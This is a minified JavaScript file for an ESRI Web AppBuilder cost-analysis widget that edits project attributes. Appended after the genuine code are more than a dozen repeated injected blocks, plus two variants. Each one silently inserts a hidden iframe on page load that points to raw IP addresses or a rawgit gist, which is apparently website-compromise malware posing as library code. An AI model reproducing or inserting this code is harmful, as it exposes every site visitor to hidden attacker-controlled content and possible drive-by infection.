// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/project-attribute.html":'\x3cdiv style\x3d"height: 100%; width: 100%"\x3e\r\n  \x3cdiv class\x3d"esriCTContentSection"\x3e\r\n    \x3cdiv class\x3d"esriCTProjectAttributeTitle"\x3e\r\n      ${nls.projectAttribute.projectAttributeTitle}\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"projectAttributeNode"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"okButton"\x3e${nls.common.ok}\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"cancelButton"\x3e${nls.common.cancel}\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget jimu/utils dojo/Evented dijit/layout/ContentPane dijit/_WidgetsInTemplateMixin dojo/text!./project-attribute.html dojo/_base/lang dojo/_base/array dojo/dom-style dojo/on dojo/dom-construct dojo/dom-class esri/dijit/AttributeInspector esri/layers/FeatureLayer esri/tasks/query".split(" "),function(k,l,m,n,p,q,r,d,f,t,g,e,h,u,v,w){return k([l,n,q],{templateString:r,baseClass:"jimu-widget-cost-analysis-project-attribute",projectInfo:null,_projectLayerInfo:null,
_updatedFeature:null,_attributeInspector:null,postCreate:function(){this.inherited(arguments);this.onProjectLoad(this.projectInfo)},startup:function(){this.inherited(arguments);this.own(g(this.okButton,"click",d.hitch(this,function(){this._updatedFeature&&this._updatedFeature.getLayer().applyEdits(null,[this._updatedFeature],null);this.emit("onOkButtonClicked")})));this.own(g(this.cancelButton,"click",d.hitch(this,function(){this.emit("onCancelButtonClicked")})))},onProjectLoad:function(b){this.projectInfo=
b;b=this.config.projectSettings.projectLayer;this.projectInfo.projectId&&b&&(this._projectLayerInfo=this.layerInfosObj.getLayerInfoById(b),this._loadAttributeInspector())},editProjectAttributes:function(){var b,c,a="";this._projectLayerInfo&&(this.loadingIndicator.show(),c=Date.now(),this._updatedFeature=null,b=new w,(a=this._projectLayerInfo.layerObject.getDefinitionExpression())&&this._projectLayerInfo.layerObject.setDefinitionExpression(""),b.where=this._projectLayerInfo.layerObject.globalIdField+
" \x3d '"+this.projectInfo.projectId+"' AND "+c+" \x3d "+c,this._projectLayerInfo.layerObject.selectFeatures(b,v.SELECTION_NEW,d.hitch(this,function(b){this._updatedFeature=b[0];this._attributeInspector&&(this._attributeInspector.refresh(),t.set(this._attributeInspector.attributeTable,"display",""));this.loadingIndicator.hide();a&&this._projectLayerInfo.layerObject.setDefinitionExpression(a)})))},mergeFirstToLast:function(){for(var b={},c=arguments.length-1,a;0<=c;c--)for(a in arguments[c])arguments[c].hasOwnProperty(a)&&
(b[a]=arguments[c][a]);return b},_getFieldInfosFromLayer:function(b){var c=[];b&&b.layerObject&&f.forEach(b.layerObject.fields,function(b){var a=m.getDefaultPortalFieldInfo(b),a=this.mergeFirstToLast(a,b);a.format&&a.format.dateFormat&&a.format.dateFormat.toLowerCase()&&0<=a.format.dateFormat.toLowerCase().indexOf("time")&&(a.format.time=!0);a.visible=!0;c.push(a)},this);return c},_createFieldInfos:function(){var b,c;c=this._projectLayerInfo.controlPopupInfo&&this._projectLayerInfo.controlPopupInfo.enablePopup&&
this._projectLayerInfo.controlPopupInfo.infoTemplate?d.clone(this._projectLayerInfo.controlPopupInfo.infoTemplate.info.fieldInfos):this._getFieldInfosFromLayer(this._projectLayerInfo);b=[];f.forEach(c,d.hitch(this,function(a){if(a.visible){if("PROJECTNAME"===a.fieldName.toUpperCase()||"TOTALASSETCOST"===a.fieldName.toUpperCase()||"GROSSPROJECTCOST"===a.fieldName.toUpperCase())a.isEditable=!1;b.push(a)}}));return b},_loadAttributeInspector:function(){var b,c;this._projectLayerInfo&&(c=this._createFieldInfos(),
e.empty(this.projectAttributeNode),b=new p({style:{padding:"0"}},e.create("div",{},this.projectAttributeNode)),this._attributeInspector=new u({layerInfos:[{featureLayer:this._projectLayerInfo.layerObject,showAttachments:!1,isEditable:!0,fieldInfos:c}]},e.create("div")),this._attributeInspector.on("attribute-change",d.hitch(this,function(a){this._updatedFeature.attributes[a.fieldName]=a.fieldValue})),h.add(this._attributeInspector.layerName,"esriCTHidden"),h.add(this._attributeInspector.editButtons,
"esriCTHidden"),b.setContent(this._attributeInspector.domNode))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});